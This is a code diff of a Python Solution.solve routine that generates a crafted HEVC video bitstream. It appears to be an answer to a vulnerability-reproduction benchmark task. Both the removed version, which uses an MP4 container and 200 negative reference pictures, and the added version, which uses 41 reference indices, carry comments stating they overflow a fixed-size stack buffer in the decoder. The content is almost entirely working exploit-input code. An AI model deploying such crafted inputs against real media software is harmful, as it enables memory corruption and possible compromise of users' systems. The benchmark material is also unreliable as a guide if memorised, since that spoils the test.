@@ -1,185 +1,205 @@
 import struct
 
-class BitWriter:
-    def __init__(self):
-        self.data = bytearray()
-        self.val = 0
-        self.bits = 0
-
-    def write_bits(self, value, n):
-        for i in range(n - 1, -1, -1):
-            bit = (value >> i) & 1
-            self.val = (self.val << 1) | bit
-            self.bits += 1
-            if self.bits == 8:
-                self.data.append(self.val)
-                self.val = 0
-                self.bits = 0
-
-    def write_ue(self, value):
-        if value == 0:
-            self.write_bits(1, 1)
-        else:
-            tmp = value + 1
-            length = tmp.bit_length() - 1
-            self.write_bits(0, length)
-            self.write_bits(1, 1)
-            self.write_bits(tmp - (1 << length), length)
-
-    def write_se(self, value):
-        if value <= 0:
-            self.write_ue(-2 * value)
-        else:
-            self.write_ue(2 * value - 1)
-
-    def write_align(self):
-        if self.bits > 0:
-            self.write_bits(1, 1)
-            while self.bits > 0:
-                self.write_bits(0, 1)
-
-    def get_bytes(self):
-        return bytes(self.data)
-
-def escape(data):
-    out = bytearray()
-    zeros = 0
-    for b in data:
-        if zeros >= 2 and b <= 3:
-            out.append(3)
-            zeros = 0
-        out.append(b)
-        if b == 0:
-            zeros += 1
-        else:
-            zeros = 0
-    return bytes(out)
-
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        # 1. VPS
-        bs_vps = BitWriter()
-        bs_vps.write_bits(0x4001, 16) # NAL type 32
-        bs_vps.write_bits(0, 4) # vps_id
-        bs_vps.write_bits(3, 2)
-        bs_vps.write_bits(0, 6)
-        bs_vps.write_bits(0, 3)
-        bs_vps.write_bits(1, 1) # nesting
-        bs_vps.write_bits(0xffff, 16)
-        bs_vps.write_bits(0, 2); bs_vps.write_bits(0, 1); bs_vps.write_bits(1, 5) # Profile Main
-        bs_vps.write_bits(0x60000000, 32) # Compat flags
-        bs_vps.write_bits(0b1011 << 44, 48) # Constraints
-        bs_vps.write_bits(30, 8) # Level
-        bs_vps.write_bits(1, 1) # sub layer ordering
-        bs_vps.write_ue(0); bs_vps.write_ue(0); bs_vps.write_ue(0)
-        bs_vps.write_bits(0, 6); bs_vps.write_ue(0); bs_vps.write_bits(0, 1); bs_vps.write_bits(0, 1)
-        bs_vps.write_align()
-        vps_data = escape(bs_vps.get_bytes())
-
-        # 2. SPS
-        bs_sps = BitWriter()
-        bs_sps.write_bits(0x4201, 16) # NAL type 33
-        bs_sps.write_bits(0, 4) # vps_id
-        bs_sps.write_bits(0, 3) # max_sub_layers
-        bs_sps.write_bits(1, 1) # nesting
-        bs_sps.write_bits(0, 2); bs_sps.write_bits(0, 1); bs_sps.write_bits(1, 5)
-        bs_sps.write_bits(0x60000000, 32)
-        bs_sps.write_bits(0b1011 << 44, 48)
-        bs_sps.write_bits(30, 8)
-        bs_sps.write_ue(0) # sps_id
-        bs_sps.write_ue(1) # chroma
-        bs_sps.write_ue(64); bs_sps.write_ue(64)
-        bs_sps.write_bits(0, 1)
-        bs_sps.write_ue(0); bs_sps.write_ue(0)
-        bs_sps.write_ue(4) # log2_max_poc_lsb - 4
-        bs_sps.write_bits(0, 1)
-        bs_sps.write_ue(0); bs_sps.write_ue(0); bs_sps.write_ue(0)
-        bs_sps.write_ue(0); bs_sps.write_ue(0); bs_sps.write_ue(0); bs_sps.write_ue(0)
-        bs_sps.write_ue(0); bs_sps.write_ue(0)
-        bs_sps.write_bits(0, 1); bs_sps.write_bits(0, 1)
-        bs_sps.write_bits(0, 1); bs_sps.write_bits(0, 1)
         
-        # VULNERABILITY: num_short_term_ref_pic_sets = 1
-        bs_sps.write_ue(1) 
-        # rps 0
-        # num_negative_pics = 200 (Overflows fixed stack buffer)
-        bs_sps.write_ue(200) 
-        bs_sps.write_ue(0) # num_positive_pics
-        for _ in range(200):
-            bs_sps.write_ue(0)
-            bs_sps.write_bits(1, 1)
+        class BitStream:
+            def __init__(self):
+                self.bits = []
             
-        bs_sps.write_bits(0, 1); bs_sps.write_bits(0, 1); bs_sps.write_bits(0, 1)
-        bs_sps.write_bits(0, 1); bs_sps.write_bits(0, 1)
-        bs_sps.write_align()
-        sps_data = escape(bs_sps.get_bytes())
+            def u(self, n, val):
+                s = f"{val:0{n}b}"
+                if len(s) > n:
+                    s = s[-n:] 
+                self.bits.append(s)
+            
+            def ue(self, val):
+                if val == 0:
+                    self.bits.append("1")
+                    return
+                x = val + 1
+                b = f"{x:b}"
+                m = len(b) - 1
+                self.bits.append("0" * m + b)
+                
+            def se(self, val):
+                if val <= 0:
+                    v = (-val) * 2
+                else:
+                    v = val * 2 - 1
+                self.ue(v)
+            
+            def get_rbsp(self):
+                s = "".join(self.bits)
+                s += "1" 
+                while len(s) % 8 != 0:
+                    s += "0"
+                
+                data = bytearray()
+                for i in range(0, len(s), 8):
+                    data.append(int(s[i:i+8], 2))
+                return data
 
-        # 3. PPS
-        bs_pps = BitWriter()
-        bs_pps.write_bits(0x4401, 16) # NAL type 34
-        bs_pps.write_ue(0); bs_pps.write_ue(0)
-        bs_pps.write_bits(0, 1); bs_pps.write_bits(0, 1); bs_pps.write_bits(0, 3)
-        bs_pps.write_bits(0, 1); bs_pps.write_bits(0, 1)
-        bs_pps.write_ue(0); bs_pps.write_ue(0); bs_pps.write_se(0)
-        bs_pps.write_bits(0, 1); bs_pps.write_bits(0, 1); bs_pps.write_bits(0, 1)
-        bs_pps.write_ue(0); bs_pps.write_se(0); bs_pps.write_se(0)
-        bs_pps.write_bits(0, 1); bs_pps.write_bits(0, 1); bs_pps.write_bits(0, 1)
-        bs_pps.write_bits(0, 1); bs_pps.write_bits(0, 1); bs_pps.write_bits(0, 1); bs_pps.write_bits(0, 1)
-        bs_pps.write_align()
-        pps_data = escape(bs_pps.get_bytes())
+        def make_nal(nal_type, rbsp_data):
+            # Header: F(0) Type(6) Layer(6) TID(3)
+            # byte 1: (0 << 7) | (type << 1) | (layer >> 5)
+            # layer=0.
+            b1 = (nal_type << 1) & 0x7E
+            # byte 2: (layer & 0x1F) << 3 | tid
+            # tid=1
+            b2 = 1 
+            
+            # EP
+            ep_data = bytearray()
+            zero_cnt = 0
+            for b in rbsp_data:
+                if zero_cnt >= 2 and b <= 3:
+                    ep_data.append(3)
+                    zero_cnt = 0
+                ep_data.append(b)
+                if b == 0:
+                    zero_cnt += 1
+                else:
+                    zero_cnt = 0
+            
+            return b'\x00\x00\x00\x01' + bytes([b1, b2]) + ep_data
 
-        # 4. Slice
-        bs_sl = BitWriter()
-        bs_sl.write_bits(0x0201, 16) # NAL type 1
-        bs_sl.write_bits(1, 1) # first_slice
-        bs_sl.write_ue(0) # pps_id
-        bs_sl.write_ue(0) # slice_type B
-        bs_sl.write_bits(0, 8) # pic_order_cnt_lsb
-        bs_sl.write_bits(1, 1) # short_term_ref_pic_set_sps_flag = 1
-        bs_sl.write_ue(0) # short_term_ref_pic_set_idx = 0 (the malicious one)
-        bs_sl.write_ue(0); bs_sl.write_bits(0, 1)
-        bs_sl.write_bits(0, 1); bs_sl.write_bits(0, 1); bs_sl.write_bits(0, 1)
-        bs_sl.write_ue(0)
-        bs_sl.write_align()
-        slice_nal = escape(bs_sl.get_bytes())
+        # --- VPS (Type 32) ---
+        bs = BitStream()
+        bs.u(4, 0) # vps_id
+        bs.u(1, 1) # base_layer_internal
+        bs.u(1, 1) # base_layer_available
+        bs.u(6, 0) # max_layers_minus1
+        bs.u(3, 0) # max_sub_layers_minus1
+        bs.u(1, 1) # temporal_id_nesting
+        bs.u(16, 0xFFFF) 
+        # PTL
+        bs.u(2, 0) 
+        bs.u(1, 0) 
+        bs.u(5, 1) 
+        bs.u(32, 0x60000000) 
+        bs.u(1, 1) 
+        bs.u(1, 0) 
+        bs.u(1, 0) 
+        bs.u(1, 1) 
+        bs.u(44, 0) 
+        # sub_layer_ordering
+        bs.u(1, 0) # present_flag=0
+        bs.ue(1) 
+        bs.ue(0) 
+        bs.ue(0) 
         
-        sample = struct.pack(">I", len(slice_nal)) + slice_nal
+        bs.u(6, 0) 
+        bs.ue(0) 
+        bs.u(1, 0) 
+        bs.u(1, 0) 
+        vps = make_nal(32, bs.get_rbsp())
 
-        # hvcC content
-        hvcc = bytearray([1, 1]) + struct.pack(">I", 0x60000000) + struct.pack(">Q", 0b1011 << 44)[2:] + b'\x1e\xf0\x00\xfc\xfd\xf8\xf8\x00\x00\x0f\x03'
-        hvcc.append(0x80 | 32); hvcc.extend(struct.pack(">H", 1)); hvcc.extend(struct.pack(">H", len(vps_data))); hvcc.extend(vps_data)
-        hvcc.append(0x80 | 33); hvcc.extend(struct.pack(">H", 1)); hvcc.extend(struct.pack(">H", len(sps_data))); hvcc.extend(sps_data)
-        hvcc.append(0x80 | 34); hvcc.extend(struct.pack(">H", 1)); hvcc.extend(struct.pack(">H", len(pps_data))); hvcc.extend(pps_data)
-
-        # Assemble MP4
-        def box(t, d): return struct.pack(">I", 8+len(d)) + t + d
+        # --- SPS (Type 33) ---
+        bs = BitStream()
+        bs.u(4, 0) 
+        bs.u(3, 0) 
+        bs.u(1, 1) 
+        # PTL
+        bs.u(2, 0) 
+        bs.u(1, 0) 
+        bs.u(5, 1) 
+        bs.u(32, 0x60000000) 
+        bs.u(1, 1) 
+        bs.u(1, 0) 
+        bs.u(1, 0) 
+        bs.u(1, 1) 
+        bs.u(44, 0) 
         
-        ftyp = b'ftypisom\x00\x00\x02\x00isomiso2mp41'
+        bs.ue(0) # sps_id
+        bs.ue(1) # chroma 4:2:0
+        bs.ue(64) 
+        bs.ue(64) 
+        bs.u(1, 0) 
+        bs.ue(0) 
+        bs.ue(0) 
+        bs.ue(0) # log2_max_pic_order_cnt_lsb_minus4
+        bs.u(1, 0) # sub_layer_ordering=0
+        bs.ue(1) 
+        bs.ue(0) 
+        bs.ue(0) 
         
-        hvc1_entry = box(b"hvc1", b'\x00'*6 + b'\x00\x01' + b'\x00'*16 + struct.pack(">HH", 64, 64) + b'\x00\x48\x00\x00\x00\x48\x00\x00' + b'\x00'*4 + b'\x00\x01' + b'\x04path' + b'\x00'*27 + b'\x00\x18\xff\xff' + box(b"hvcC", hvcc))
-        stsd = box(b"stsd", b'\x00'*4 + struct.pack(">I", 1) + hvc1_entry)
-        stts = box(b"stts", b'\x00'*4 + struct.pack(">I", 1) + struct.pack(">II", 1, 1000))
-        stsc = box(b"stsc", b'\x00'*4 + struct.pack(">I", 1) + struct.pack(">III", 1, 1, 1))
-        stsz = box(b"stsz", b'\x00'*4 + struct.pack(">I", 0) + struct.pack(">I", 1) + struct.pack(">I", len(sample)))
+        bs.ue(0) 
+        bs.ue(0) 
+        bs.ue(0) 
+        bs.ue(0) 
+        bs.ue(0) 
+        bs.ue(0) 
         
-        # First pass with dummy stco to calc size
-        stco_dummy = box(b"stco", b'\x00'*4 + struct.pack(">I", 1) + struct.pack(">I", 0))
-        stbl = box(b"stbl", stsd + stts + stsc + stsz + stco_dummy)
+        bs.u(1, 0) 
+        bs.u(1, 0) 
+        bs.u(1, 0) 
+        bs.u(1, 0) 
         
-        minf = box(b"minf", box(b"vmhd", b'\x00'*4 + b'\x00\x01\x00\x00\x00\x00\x00\x00') + box(b"dinf", box(b"dref", b'\x00'*4 + struct.pack(">I", 1) + box(b"url ", b'\x00'*4))) + stbl)
-        mdia = box(b"mdia", box(b"mdhd", b'\x00'*4 + struct.pack(">II", 1000, 1000) + b'\x55\xc4\x00\x00') + box(b"hdlr", b'\x00'*8 + b'vide' + b'\x00'*12 + b'VideoHandler\x00') + minf)
-        trak = box(b"trak", box(b"tkhd", b'\x00\x00\x00\x03' + struct.pack(">I", 0) + struct.pack(">I", 8) + b'\x00'*20 + struct.pack(">II", 1000, 0) + b'\x00'*16 + b'\x00\x01\x00\x00' + b'\x00'*4 + b'\x00\x01\x00\x00' + b'\x00'*4 + b'\x40\x00\x00\x00' + b'\x00'*24 + struct.pack(">II", 64<<16, 64<<16)) + mdia)
-        mvhd = box(b"mvhd", b'\x00'*4 + struct.pack(">II", 0, 0) + struct.pack(">II", 1000, 1000) + b'\x00\x01\x00\x00\x01\x00\x00\x00' + b'\x00'*8 + b'\x00\x01\x00\x00' + b'\x00'*4 + b'\x00\x01\x00\x00' + b'\x00'*4 + b'\x40\x00\x00\x00' + b'\x00'*24 + struct.pack(">I", 2))
-        moov = box(b"moov", mvhd + trak)
+        bs.ue(0) # num_short_term_rps
+        bs.u(1, 0) 
+        bs.u(1, 0) 
+        bs.u(1, 0) 
+        bs.u(1, 0) 
+        bs.u(1, 0) 
+        sps = make_nal(33, bs.get_rbsp())
         
-        offset = len(ftyp) + len(moov) + 8
+        # --- PPS (Type 34) ---
+        bs = BitStream()
+        bs.ue(0) 
+        bs.ue(0) 
+        bs.u(1, 0) 
+        bs.u(1, 0) 
+        bs.u(3, 0) 
+        bs.u(1, 0) 
+        bs.u(1, 0) 
+        bs.ue(0) 
+        bs.ue(0) 
+        bs.se(0) 
+        bs.u(1, 0) 
+        bs.u(1, 0) 
+        bs.u(1, 0) 
+        bs.se(0) 
+        bs.se(0) 
+        bs.u(1, 0) 
+        bs.u(1, 0) 
+        bs.u(1, 0) 
+        bs.u(1, 0) 
+        bs.u(1, 0) 
+        bs.u(1, 0) 
+        bs.u(1, 0) 
+        bs.u(1, 0) 
+        bs.u(1, 0) 
+        bs.u(1, 0) 
+        bs.u(1, 0) 
+        bs.u(1, 0) 
+        bs.u(1, 0) 
+        pps = make_nal(34, bs.get_rbsp())
         
-        # Second pass with real stco
-        stco_real = box(b"stco", b'\x00'*4 + struct.pack(">I", 1) + struct.pack(">I", offset))
-        stbl = box(b"stbl", stsd + stts + stsc + stsz + stco_real)
-        minf = box(b"minf", box(b"vmhd", b'\x00'*4 + b'\x00\x01\x00\x00\x00\x00\x00\x00') + box(b"dinf", box(b"dref", b'\x00'*4 + struct.pack(">I", 1) + box(b"url ", b'\x00'*4))) + stbl)
-        mdia = box(b"mdia", box(b"mdhd", b'\x00'*4 + struct.pack(">II", 1000, 1000) + b'\x55\xc4\x00\x00') + box(b"hdlr", b'\x00'*8 + b'vide' + b'\x00'*12 + b'VideoHandler\x00') + minf)
-        trak = box(b"trak", box(b"tkhd", b'\x00\x00\x00\x03' + struct.pack(">I", 0) + struct.pack(">I", 8) + b'\x00'*20 + struct.pack(">II", 1000, 0) + b'\x00'*16 + b'\x00\x01\x00\x00' + b'\x00'*4 + b'\x00\x01\x00\x00' + b'\x00'*4 + b'\x40\x00\x00\x00' + b'\x00'*24 + struct.pack(">II", 64<<16, 64<<16)) + mdia)
-        moov = box(b"moov", mvhd + trak)
+        # --- Slice (Type 1 - TRAIL_R) ---
+        bs = BitStream()
+        bs.u(1, 1) # first_slice
+        bs.ue(0) # slice_pps_id
+        bs.ue(0) # slice_type=B
+        bs.u(4, 0) # slice_pic_order_cnt_lsb
         
-        return ftyp + moov + box(b"mdat", sample)
+        bs.u(1, 0) # short_term_ref_pic_set_sps_flag=0
+        # st_ref_pic_set
+        bs.u(1, 0) # inter_ref_pic_set_prediction_flag
+        bs.ue(1) # num_negative_pics
+        bs.ue(0) # num_positive_pics
+        bs.ue(0) # delta_poc_s0_minus1[0]
+        bs.u(1, 1) # used_by_curr_pic_s0_flag[0]
+        
+        # slice_type=B != I
+        bs.u(1, 1) # num_ref_idx_active_override_flag
+        bs.ue(40)  # num_ref_idx_l0_active_minus1 -> 41 entries. Overflow Stack Buffer (size 16)
+        bs.ue(0)   # num_ref_idx_l1_active_minus1
+        
+        bs.u(1, 1) # mvd_l1_zero_flag
+        bs.ue(0) # five_minus_max_num_merge_cand
+        bs.se(0) # slice_qp_delta
+        
+        slice_nal = make_nal(1, bs.get_rbsp())
+        
+        return vps + sps + pps + slice_nal
